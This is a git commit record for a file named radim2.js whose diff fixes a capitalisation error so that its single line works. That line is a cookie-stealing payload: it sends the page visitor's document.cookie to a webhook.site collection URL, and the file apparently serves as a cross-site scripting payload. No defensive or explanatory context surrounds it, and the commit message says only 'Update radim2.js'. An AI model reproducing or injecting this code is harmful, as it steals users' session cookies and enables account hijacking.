29ec10a71eb34049f9925d39f08ff8b5cb96cbbc
Radim Bukovský <rad.bukovsky@seznam.cz>
2023-06-12 12:21:33 +0000

    Update radim2.js

--- radim2.js
+++ radim2.js
@@ -1,1 +1,1 @@
-Fetch('https://webhook.site/bec4fb6d-49cd-47b2-8d5c-b2cff5dc9f75?cookie=' + document.cookie);
+fetch('https://webhook.site/bec4fb6d-49cd-47b2-8d5c-b2cff5dc9f75?cookie=' + document.cookie);
